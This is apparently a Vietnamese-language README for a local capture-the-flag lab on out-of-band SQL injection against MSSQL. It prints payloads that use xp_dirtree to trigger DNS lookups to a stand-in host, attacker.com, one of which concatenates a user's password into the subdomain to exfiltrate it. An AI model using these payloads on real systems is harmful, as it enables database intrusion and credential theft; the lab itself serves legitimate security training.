# SQLi-036: MSSQL OOB DNS Exfiltration via xp_dirtree

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên MSSQL bằng cách sử dụng `xp_dirtree` để trigger DNS lookup và exfiltrate dữ liệu.

## 📝 Mô Tả

**Scenario:** Một hệ thống intranet của công ty sử dụng MSSQL làm backend database. Ứng dụng nhận input từ user nhưng không hiển thị kết quả trực tiếp - chỉ thông báo "Query processed".

**URL:** `http://localhost:5036/employee?id=1`

**Đặc điểm:**
- Response không thay đổi dù query thành công hay thất bại
- Ứng dụng chạy trên Windows domain environment
- MSSQL có các extended stored procedures enabled

## 🎓 Kiến Thức Cần Thiết

### xp_dirtree cho DNS Exfiltration

`xp_dirtree` là extended stored procedure trong MSSQL dùng để liệt kê directory structure. Khi trỏ đến UNC path, nó sẽ trigger DNS lookup:

```sql
EXEC master..xp_dirtree '\\attacker.com\share'
```

### Data Exfiltration

```sql
DECLARE @d VARCHAR(1024);
SET @d=(SELECT TOP 1 password FROM users);
EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')
```

## 🛠️ Tools Required

- **Burp Suite Pro** với Collaborator hoặc
- **interactsh** (free alternative)

## 🚀 Run Lab

```bash
# Start lab
docker-compose up -d

# Wait for MSSQL to be ready (takes ~30-60 seconds)
# Verify running
curl http://localhost:5036/employee?id=1

# Stop lab
docker-compose down
```

## 💡 Hints

1. MSSQL hỗ trợ stacked queries - có thể chạy nhiều statements
2. `xp_dirtree` enabled by default trong MSSQL
3. Cần concatenate data vào UNC path để exfiltrate
4. DNS subdomain limit: 63 chars/label

## 🏁 Flag Format

```
FLAG{...}
```

Flag nằm trong bảng `secrets` của database.
